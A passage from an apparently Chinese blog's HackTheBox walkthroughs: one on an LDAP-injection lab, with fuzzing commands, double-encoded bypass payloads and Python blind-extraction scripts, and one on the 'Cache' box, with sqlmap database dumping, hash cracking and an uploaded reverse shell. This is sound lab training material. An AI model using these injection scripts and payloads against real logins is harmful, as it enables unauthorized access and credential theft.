<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710154051.png" alt=""></p>
<blockquote>
<p>如果比较熟悉LDAP的话，这里的两个名词schema和attribute已经提示了是关于LDAP注入。</p>
</blockquote>
<p>靶机作者用一个已知的属性去存储了81位的token string，Google搜一下<code>token string (81 digits)</code>。</p>
<blockquote>
<p><a href="https://www.systutorials.com/docs/linux/man/1-stoken/">https://www.systutorials.com/docs/linux/man/1-stoken/</a></p>
</blockquote>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710154249.png" style="zoom: 67%;" />
<p>可以看到一个关键的地方，<code>Pure numeric (81-digit) &quot;ctf&quot; (compressed token format) strings</code>，和靶机的题目相契合，现在就有一点思路了，应该要去找到这个81位纯数字的token，然后用stoken工具去生成OTP。现在就主要是找到token，唯一可以利用的就是这个登录框了。</p>
<p>先随便用某个用户名和密码登录<code>admin:1234</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710164835.png" alt=""></p>
<p>返回<code>User admin not found</code>，再用SQL注入的万能密码试一试</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710164644.png" alt=""></p>
<p>直接是没有任何显示，应该是对一些特殊字符有黑名单过滤。Fuzz一下过滤了一些什么字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wfuzz -c --hw 233 -d &#39;inputUsername&#x3D;FUZZ&amp;inputOTP&#x3D;1234&#39; -w special-chars.txt 10.10.10.122&#x2F;login.php</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710165335.png" alt=""></p>
<blockquote>
<p>–hw 233 代表过滤掉形如<code>User xxx not found</code>的返回信息。</p>
</blockquote>
<p>我们发现<code>+</code>和<code>&amp;</code>返回的是232 Words，但是在页面测试一下</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710173607.png" alt=""></p>
<p>发现返回的还是<code>User + not found</code>或者<code>User &amp; not found</code>，这样的话应该是233 Words，而不是Wfuzz返回的232 Words。</p>
<p>我们尝试把这些特殊字符二次URL编码，看Web应用是否还能解析，用seclists中的doble_uri_hex.txt作为字典</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wfuzz -c --hw 233 -d &#39;inputUsername&#x3D;FUZZ&amp;inputOTP&#x3D;1234&#39; -w doble-uri-hex.txt 10.10.10.122&#x2F;login.php</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710193655.png" alt=""></p>
<p>最后Fuzz出来的被过滤的字符就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%2500 ---&gt; %00</span><br><span class="line">%2528 ---&gt; (</span><br><span class="line">%2529 ---&gt; )</span><br><span class="line">%252a ---&gt; *</span><br><span class="line">%255c ---&gt; \</span><br></pre></td></tr></table></figure>
<p>这些被过滤的字符就是LDAP注入需要过滤的所有字符，再结合<code>login.php</code>页面源代码中的hint，可以确定是LDAP注入。</p>
<h2 id="0x04-Getting-User-Access">0x04 Getting User Access</h2>
<p>先来看LDAP注入的最基本形式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&amp;</span><br><span class="line">	(password&#x3D;1234)</span><br><span class="line">	(uid&#x3D;ca01h%00)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>具体到这个靶机的话，我们需要猜解括号的个数。运用类似盲注的思想，如果注入成功，那么就会返回<code>User ca01h not found</code>。</p>
<p>假设只有一个括号：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710202659.png" alt=""></p>
<p>假设有两个括号：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710202740.png" alt=""></p>
<p>假设有三个括号：</p>
<p><img src="C:%5CUsers%5C51196%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200710202913036.png" alt="image-20200710202913036"></p>
<p>当尝试到三个括号用于闭合时，成功返回了<code>User ca01h%29%29%29%00 not found</code>，那么这个登录框的LDAP查询的基本形式就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&amp;</span><br><span class="line">	(&amp;</span><br><span class="line">		(password&#x3D;1234)</span><br><span class="line">		(uid&#x3D;ca01h)))%00</span><br><span class="line">	)</span><br><span class="line">	(&amp;|</span><br><span class="line">		(other comparing)</span><br><span class="line">	)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>接着，我们再回头去看一下Fuzz出来的被过滤的字符，其中<code>%25%2a</code>返回的消息长度为231 Words</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710203938.png" alt=""></p>
<p>发现回显的消息是<code>Cannot login</code>，说明可以用<code>*</code>通配符来盲注用户名，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">### username_burp.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_lowercase</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote_plus</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;http://10.10.10.122/login.php&#x27;</span></span><br><span class="line"></span><br><span class="line">username, done = <span class="string">&#x27;&#x27;</span>, <span class="literal">False</span></span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> done:</span><br><span class="line">	<span class="keyword">for</span> c <span class="keyword">in</span> ascii_lowercase:</span><br><span class="line">		payload = username + c + quote_plus(<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">		data = &#123;</span><br><span class="line">			<span class="string">&#x27;inputUsername&#x27;</span>: payload,</span><br><span class="line">			<span class="string">&#x27;inputOTP&#x27;</span>: <span class="string">&#x27;1234&#x27;</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		resp = requests.post(URL, data=data)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;Cannot login&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">			username += c</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        sys.stdout.write(<span class="string">f&#x27;\r<span class="subst">&#123;username&#125;</span><span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line">		time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        done = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">f&#x27;[+] Username: <span class="subst">&#123;username&#125;</span> \n&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710210916.png" alt=""></p>
<p>用户名为<code>ldapuser</code></p>
<p>知道了用户名之后，我们就要去获取生成OTP的81位token，通过页面源代码的提示，这个token存储在某一个LDAP默认已经存在的属性当中。而默认的属性可以在<a href="https://www.youtube.com/watch?v=51JQg202csw">PayloadsAllTheThings</a>中找到：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c</span><br><span class="line">cn</span><br><span class="line">co</span><br><span class="line">commonName</span><br><span class="line">dc</span><br><span class="line">facsimileTelephoneNumber</span><br><span class="line">givenName</span><br><span class="line">gn</span><br><span class="line">homePhone</span><br><span class="line">id</span><br><span class="line">jpegPhoto</span><br><span class="line">l</span><br><span class="line">mail</span><br><span class="line">mobile</span><br><span class="line">name</span><br><span class="line">o</span><br><span class="line">objectClass</span><br><span class="line">ou</span><br><span class="line">owner</span><br><span class="line">pager</span><br><span class="line">password</span><br><span class="line">sn</span><br><span class="line">st</span><br><span class="line">surname</span><br><span class="line">uid</span><br><span class="line">username</span><br><span class="line">userPassword</span><br></pre></td></tr></table></figure>
<p>如果不想写脚本的话用wfuzz来Fuzz靶机的LDAP中存在的属性可能会更快一些，但还是要先找到注入的形式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&amp;</span><br><span class="line">	(&amp;</span><br><span class="line">		(password&#x3D;1234)</span><br><span class="line">		(uid&#x3D;ldapuser)</span><br><span class="line">		(FUZZ&#x3D;*)</span><br><span class="line">	)</span><br><span class="line">	(&amp;|</span><br><span class="line">		(other comparing)</span><br><span class="line">	)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>此外还要把注入的字符<code>ldapuser)(FUZZ=*</code>进行二次URL编码，编码之后的结果<code>ldapuser%2529%2528FUZZ%253d%252a</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wfuzz -c --hw 233 -d &#39;inputUsername&#x3D;ldapuser%2529%2528FUZZ%253d%252a&amp;inputOTP&#x3D;1234&#39; -w LDAP_attributes.txt http:&#x2F;&#x2F;10.10.10.122&#x2F;login.php</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710213532.png" alt=""></p>
<p>我们Fuzz出来了这么些属性是存在于靶机的LDAP服务中的，现在的工作就是一个一个的属性来猜解，属于一些重复性的工作，就不在这里过多赘述了，最后可以找到token是存储于pager属性中。接着写脚本burp81位token</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># pager_burp.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits</span><br><span class="line"></span><br><span class="line">token = <span class="string">&quot;&quot;</span></span><br><span class="line">URL = <span class="string">&quot;http://10.10.10.122/login.php&quot;</span></span><br><span class="line">attribute = <span class="string">&quot;pager&quot;</span></span><br><span class="line">loop = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> loop &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">for</span> digit <span class="keyword">in</span> digits:</span><br><span class="line">        token = token</span><br><span class="line">        <span class="comment"># ldapuser)(pager=&lt;token&gt;)*</span></span><br><span class="line">        payload = <span class="string">f&quot;ldapuser%29%28<span class="subst">&#123;attribute&#125;</span>%3d<span class="subst">&#123;token&#125;</span><span class="subst">&#123;digit&#125;</span>%2a&quot;</span></span><br><span class="line">        data = &#123;<span class="string">&quot;inputUsername&quot;</span>: payload, <span class="string">&quot;inputOTP&quot;</span>: <span class="string">&quot;1234&quot;</span>&#125;</span><br><span class="line">        r = requests.post(URL, data=data)</span><br><span class="line">        sys.stdout.write(<span class="string">f&quot;\rToken: <span class="subst">&#123;token&#125;</span><span class="subst">&#123;digit&#125;</span>&quot;</span>)</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;Cannot login&quot;</span> <span class="keyword">in</span> r.content:</span><br><span class="line">            token += digit</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> digit == <span class="string">&quot;9&quot;</span>:</span><br><span class="line">            loop = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">f&#x27;[+] Token: <span class="subst">&#123;token&#125;</span> \n&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710220938.png" alt=""></p>
<p>这里值得注意的是需要删掉最后的一个9，所以最后的token就是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">285449490011357156531651545652335570713167411445727140604172141456711102716717000</span><br></pre></td></tr></table></figure>
<p>接着用stoken工具导入token</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710221459.png" alt=""></p>
<p>生成OTP</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710230111.png" alt=""></p>
<p>成功登录后，跳转到<code>page.php</code>页面，可以执行命令</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710230246.png" alt=""></p>
<p>但是提示我们<code>ldapuser</code>权限不够不能执行命令，这里有两种办法：</p>
<ul>
<li>
<p>对<code>group</code>属性进行注入，即把后面group属性的filter截断</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&amp;</span><br><span class="line">	(&amp;</span><br><span class="line">		(pager&#x3D;&lt;token&gt;)</span><br><span class="line">		(uid&#x3D;ldapuser)))%00</span><br><span class="line">	)</span><br><span class="line">	(|</span><br><span class="line">		(group&#x3D;root)</span><br><span class="line">		(group&#x3D;adm)</span><br><span class="line">	)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>使用<code>*</code>通配符作为用户名登录</p>
</li>
</ul>
<p>这里演示一下第一种方案，payload直接放到burp中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldapuser%2529%2529%2529%2500</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710233124.png" alt=""></p>
<p>再去执行ls命令</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710233303.png" alt=""></p>
<p>读取page.php文件：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710234438.png" alt=""></p>
<p>SSH登录：<code>fdapuser:e398e27d5c4ad45086fe431120932a01</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710234624.png" alt=""></p>
]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>靶机</tag>
        <tag>HTB</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::Cache Walkthrough</title>
    <url>/Target_drone/HackTheBox/19.HackTheBox-Cache-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-Cache-Walkthrough">HTB::Cache Walkthrough</h1>
<h2 id="0x01-Info-Card">0x01 Info Card</h2>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200526163301.png" style="zoom:80%;" />
<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
<ul>
<li>nmap</li>
<li>cewl</li>
<li>wfuzz</li>
<li>sqlmap</li>
<li>openEMR exploit</li>
<li>memcached exploit</li>
<li>docker priv</li>
</ul>
<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<h3 id="Initial-Enumeration">Initial Enumeration</h3>
<h4 id="nmap扫描">nmap扫描</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Wed May 20 16:58:59 2020 as: nmap -sC -sV -Pn -oN ippsec_scan.txt 10.10.10.188</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.188</span><br><span class="line">Host is up (0.29s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)</span><br><span class="line">|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)</span><br><span class="line">|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Cache</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Wed May 20 17:00:01 2020 -- 1 IP address (1 host up) scanned in 61.63 seconds</span></span><br></pre></td></tr></table></figure>
<h4 id="80端口">80端口</h4>
<p>主页没有什么有效信息，尝试暴力破解：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200528101145.png" alt=""></p>
<p>页面加载了<code>functionality.js</code>：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> error_correctPassword = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">var</span> error_username = <span class="literal">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkCorrectPassword</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> Password = $(<span class="string">&quot;#password&quot;</span>).val();</span><br><span class="line">        <span class="keyword">if</span>(Password != <span class="string">&#x27;H@v3_fun&#x27;</span>)&#123;</span><br><span class="line">            alert(<span class="string">&quot;Password didn&#x27;t Match&quot;</span>);</span><br><span class="line">            error_correctPassword = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkCorrectUsername</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> Username = $(<span class="string">&quot;#username&quot;</span>).val();</span><br><span class="line">        <span class="keyword">if</span>(Username != <span class="string">&quot;ash&quot;</span>)&#123;</span><br><span class="line">            alert(<span class="string">&quot;Username didn&#x27;t Match&quot;</span>);</span><br><span class="line">            error_username = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $(<span class="string">&quot;#loginform&quot;</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">        <span class="comment">/* Act on the event */</span></span><br><span class="line">        error_correctPassword = <span class="literal">false</span>;</span><br><span class="line">         checkCorrectPassword();</span><br><span class="line">         error_username = <span class="literal">false</span>;</span><br><span class="line">         checkCorrectUsername();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(error_correctPassword == <span class="literal">false</span> &amp;&amp; error_username ==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>有登录名和密码<code>ash:H@v3_fun</code>，成功登录之后也没有可以利用的点，再查看<code>Author</code>页面：</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200526164125.png" style="zoom: 50%;" />
<p>实在是没啥思路，去HTB forum私聊一下各位大佬，提示我用cewl工具提取Autor page’s information，以及FUZZ HOST。</p>
<p>后来才知道用这个页面的单词和cewl工具生成一个包含域名的字典：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># kali @ kali in ~&#x2F;HackTheBox&#x2F;Cache [16:24:16]</span><br><span class="line">$ cewl -w wordlist.txt -d 10 -m 1 http:&#x2F;&#x2F;10.10.10.188&#x2F;author.html</span><br><span class="line">CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https:&#x2F;&#x2F;digi.ninja&#x2F;)</span><br></pre></td></tr></table></figure>
<p>用wfuzz查找域名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># kali @ kali in ~&#x2F;HackTheBox&#x2F;Cache [16:52:57] </span><br><span class="line">$ wfuzz -w wordlist.txt -H &quot;HOST: FUZZ.htb&quot; -u http:&#x2F;&#x2F;10.10.10.188&#x2F; --hc 400 --hh 8193</span><br><span class="line"></span><br><span class="line">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.</span><br><span class="line"></span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.4.5 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http:&#x2F;&#x2F;10.10.10.188&#x2F;</span><br><span class="line">Total requests: 42</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">ID           Response   Lines    Word     Chars       Payload</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">000000037:   302        0 L      0 W      0 Ch        &quot;HMS&quot;</span><br><span class="line"></span><br><span class="line">Total time: 2.130227</span><br><span class="line">Processed Requests: 42</span><br><span class="line">Filtered Requests: 41</span><br><span class="line">Requests&#x2F;sec.: 19.71620</span><br></pre></td></tr></table></figure>
<blockquote>
<p>–hc 404 --hh 8193 这两个参数是为了限制一些无效的返回消息。</p>
</blockquote>
<p>把<code>HMS.htb</code>加入到<code>/etc/hosts</code>文件中。</p>
<h4 id="HMS-htb">HMS.htb</h4>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200526165608.png" alt=""></p>
<p>弱口令无效，查找有没有公开的利用方式：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200526165926.png" alt=""></p>
<p>发现已经有很多不同版本的exploit，再尝试用<code>OpenEMR &lt; 5.0.1 - (Authenticated) Remote Code Execution</code>，运行之后提示要系统的账号和密码。Google OpenEMR，在YouTube上看到了一个SQL注入的相关漏洞。</p>
<blockquote>
<p><a href="https://www.youtube.com/watch?v=DJSQ8Pk_7hc&amp;t=73s">https://www.youtube.com/watch?v=DJSQ8Pk_7hc&amp;t=73s</a></p>
</blockquote>
<p>根据视频的步骤，首先访问<code>http://hms.htb/portal</code></p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200526172026.png" style="zoom:67%;" />
<p>点击<code>Register</code>后访问<code>http://hms.htb/portal/add_edit_event_user.php</code>，这里的<code>eid</code>参数存在SQL注入：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200527114620.png" alt=""></p>
<p>用burp拦截请求，并且把请求数据保存到<code>req.txt</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;portal&#x2F;add_edit_event_user.php?eid&#x3D;1 HTTP&#x2F;1.1</span><br><span class="line">Host: hms.htb</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: OpenEMR&#x3D;0bcd8bfgl4rl2sfc8qmg63u09b; PHPSESSID&#x3D;juj09jki6pu38k34afv60j3vb9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br></pre></td></tr></table></figure>
<h4 id="dump-database">dump database</h4>
<p>用sqlmap爆破数据库：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sqlmap -r req.txt --dbs --batch</span><br><span class="line">[11:52:46] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.1</span><br><span class="line">[11:52:46] [INFO] fetching database names</span><br><span class="line">[11:52:47] [INFO] retrieved: <span class="string">&#x27;information_schema&#x27;</span></span><br><span class="line">[11:52:48] [INFO] retrieved: <span class="string">&#x27;openemr&#x27;</span></span><br><span class="line">available databases [2]:                                                                                                                                                                                         </span><br><span class="line">[*] information_schema</span><br><span class="line">[*] openemr</span><br></pre></td></tr></table></figure>
<p>然后接着就是sqlmap一把梭，找到<code>users_secure</code>数据表，查看<code>username</code>和<code>password</code>字段，dump</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[12:03:13] [INFO] fetching entries of column(s) &#39;&#96;password&#96;, username&#39; for table &#39;users_secure&#39; in database &#39;openemr&#39;</span><br><span class="line">Database: openemr</span><br><span class="line">Table: users_secure</span><br><span class="line">[1 entry]</span><br><span class="line">+---------------+--------------------------------------------------------------+</span><br><span class="line">| username      | password                                                     |</span><br><span class="line">+---------------+--------------------------------------------------------------+</span><br><span class="line">| openemr_admin | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. |</span><br><span class="line">+---------------+--------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
<p>用john爆破hash密码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kali @ kali in ~/HackTheBox/Cache [12:11:02] </span></span><br><span class="line">$ sudo john -w=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span> </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (bcrypt [Blowfish 32/64 X3])</span><br><span class="line">Cost 1 (iteration count) is 32 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">xxxxxx           (?)</span><br><span class="line">1g 0:00:00:00 DONE (2020-05-27 12:11) 1.694g/s 1464p/s 1464c/s 1464C/s tristan..felipe</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
<p>得到登录用户名和密码：<code>openemr_admin:xxxxxx</code>。</p>
<h4 id="upload-reverse-shell">upload reverse shell</h4>
<p>通过<code>Administration-&gt;Files</code>模块上传reverse shell，写入<code>letter_templates/custom_pdf.php</code>文件中：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200528100756.png" alt=""></p>
<p>本机监听4444端口，浏览器访问<code>http://hms.htb/sites/default/letter_templates/custom_pdf.php</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo nc -lvnp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.14.2] from (UNKNOWN) [10.10.10.188] 54188</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (2111): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/sites/default/letter_templates$ id</span><br><span class="line">&lt;.htb/public_html/sites/default/letter_templates$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>
<h3 id="Getting-User-Access">Getting User Access</h3>
<p>用<code>functionality.js</code>中的登录凭证切换<code>ash</code>用户：</p>
